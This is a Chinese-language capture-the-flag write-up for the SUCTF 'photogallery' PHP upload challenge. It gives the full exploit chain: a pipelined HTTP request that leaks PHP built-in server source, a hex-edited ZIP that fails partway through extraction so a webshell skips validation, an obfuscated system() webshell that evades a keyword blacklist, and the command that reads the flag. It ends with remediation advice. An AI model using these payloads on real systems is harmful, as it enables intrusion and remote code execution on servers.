# SU_photogallery

## 题目简述

题目是一个仍在开发中的 PHP 图库，支持通过 ZIP 批量上传图片。`robots.txt` 指向 `node.md`，提示开发者为了测试方便，直接在服务器上使用原有环境。容器源码确认服务由：

```bash
php -S 0.0.0.0:80 -t /tmp/suctf_web/
```

启动，PHP 版本来自 `php:7.3-cli`。

完整利用链为：

1. 利用旧版 PHP Built-in Server 的 HTTP 请求流水线状态复用漏洞，读取 `unzip.php` 源码；
2. 构造一个能“部分解压后整体返回失败”的 ZIP；
3. 让 WebShell 先被释放，而后续非法成员使 `extractTo()` 返回 `false`；
4. 借错误分支跳过图片后缀检查和随机重命名；
5. 绕过内容黑名单，动态调用未被禁用的 `system`；
6. 执行 `cat /seef1ag_getfl4g` 取得 flag。

## 解题过程

### 1. 根据服务特征定位 PHP 源码泄露

访问不存在的路径时，页面样式符合 PHP CLI 内置服务器的默认 404。Dockerfile 又固定使用 PHP 7.3，处于该源码泄露漏洞的受影响范围。

将下面两条请求作为同一段原始 TCP 数据发送，且不要自动添加或修正 `Content-Length`：

```http
GET /unzip.php HTTP/1.1
Host: challenge

GET /aa.css HTTP/1.1


```

第一条请求把：

```text
request.path_translated
```

设置为 `unzip.php` 的实际文件路径。旧版 PHP 在同一缓冲区继续解析第二条请求时，没有正确清理这个字段；第二条请求的 `.css` 扩展名又使分发逻辑按静态文件处理。最终检查使用第二条请求的扩展名，真正打开的却仍是第一条请求留下的 PHP 路径，于是返回源码而非执行脚本。

该问题在 PHP 7.4.22 修复。原始研究文章 [PHP Development Server <= 7.4.21 - Remote Source Disclosure](https://projectdiscovery.io/blog/php-http-server-source-disclosure) 还给出了补丁差异和请求解析调用栈。这里保留链接用于追溯漏洞版本；本题所需的状态残留、请求格式和静态分发原因已写入正文。

### 2. 审计 ZIP 处理流程

上传入口把 ZIP 解压到随机临时目录：

```php
$randomDir = 'tmp_'.md5(uniqid().rand(0, 99999));
$path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
mkdir($path, 0777, true);
```

正常路径会逐个检查扩展名，只允许：

```text
jpg
jpeg
png
gif
```

通过检查的文件还会被改为随机名称：

```php
$randomName =
    md5(uniqid().rand(0, 99999))
    . '.'
    . get_extension($file);
```

单独绕过扩展名没有意义，因为 `.php` 会被删除；即使伪装成图片，随机重命名也会让可访问路径不可预测。

真正缺陷在 `extractTo()` 的失败分支：

```php
if (!$zip->extractTo($path)) {
    $zip->close();
}
else {
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];

        if (!check_extension($fileName, $path)) {
            continue;
        }
        if (!file_rename($path, $fileName)) {
            continue;
        }
    }
}

if (!move_file($path, $basePath)) {
    return "move_failed";
}
```

当 ZIP 只解压了一部分便失败时：

1. 已成功释放的文件留在临时目录；
2. 程序关闭 ZIP；
3. `else` 中的扩展名检查和重命名完全不执行；
4. 程序仍调用 `move_file()`，把已释放文件原名移动到 Web 可访问目录。

这是典型的部分成功状态没有回滚：整体操作报告失败，并不代表此前的文件系统副作用已经撤销。

### 3. 构造部分解压失败的 ZIP

先创建一个普通 ZIP，并确保条目顺序为：

```text
menu.php
1.txt
```

然后在十六进制编辑器中找到第二个条目的中央目录记录，即以：

```text
PK\x01\x02
```

开头的记录。将中央目录中的 5 字节文件名：

```text
1.txt
```

改为同长度的 Linux 非法目标：

```text
/////
```

保持字段长度和其它偏移不变。上传后，`ZipArchive` 先成功释放 `menu.php`，处理第二个成员时因非法路径失败，`extractTo()` 返回 `false`。此时 `menu.php` 已存在，却不会再经过图片扩展名检查，最终被移动到：

```text
/upload/suimages/menu.php
```

ZIP 上传接口即使返回：

```text
Location: index.html?status=success
```

也不能作为唯一判断；应直接访问落地路径验证文件是否存在。

### 4. 绕过 WebShell 内容黑名单

程序在解压前扫描每个成员内容，禁止 `system`、`base64`、`flag`、`exec`、`include` 等字符串。它还试图检测这些关键词的 Base64：

```php
function check_base($fileContent) {
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword) !== false) {
            return true;
        }
        else {
            return false;
        }
    }
}
```

但该函数第一次未命中便立即返回，实际上不能遍历完整列表。普通正则仍会拦截明文危险函数，因此把函数名分两步动态恢复：

```php
<?php
$name = 'edoced_46esab';
$decode = strrev($name);

$encoded = 'c3~@#@#@lz!@dGVt';
$command = $decode($encoded);

$command($_POST[1]);
?>
```

其含义为：

1. `strrev('edoced_46esab')` 得到 `base64_decode`；
2. PHP 的 Base64 解码会忽略字符串中的非 Base64 字符；
3. `c3~@#@#@lz!@dGVt` 清除干扰字符后是 `c3lzdGVt`；
4. 解码结果为 `system`；
5. 最后一行等价于 `system($_POST[1])`。

源码中的 `disable_functions` 禁用了 `exec`、`shell_exec`、`popen`、`proc_open` 等函数，却没有禁用 `system`，所以动态调用能够执行。

### 5. 读取 flag

WebShell 落地后发送：

```http
POST /upload/suimages/menu.php HTTP/1.1
Host: challenge
Content-Type: application/x-www-form-urlencoded

1=cat%20/seef1ag_getfl4g
```

容器中的目标文件和官方截图相互印证，flag 为：

```text
SUCTF{sti1l_w0t3r_Run_d@@p!!!}
```

## 方法总结

本题的关键不是分别绕过后缀白名单和随机文件名，而是让程序完全不进入这两段逻辑。恶意 ZIP 先产生可用文件，再用后续非法成员让 `extractTo()` 报告失败；错误分支没有清理已经释放的内容，反而继续把它们移动到公开目录。

处理上传和解包题时，应把操作拆成状态序列检查：

```text
内容预检
  -> 创建临时目录
  -> 部分文件落盘
  -> 解包失败
  -> 校验是否仍执行
  -> 已落盘文件是否回滚
  -> 是否继续移动到公开目录
```

同时，PHP Built-in Server 的源码泄露说明入口层和业务层也可能串联：先利用服务器解析器差异取得源码，再针对源码中的非原子文件处理流程构造归档。修复时应升级 PHP、避免在生产环境使用 CLI Server，并在任何解压失败时立即删除整个临时目录并返回；只有所有成员验证通过后，才能原子地发布文件。
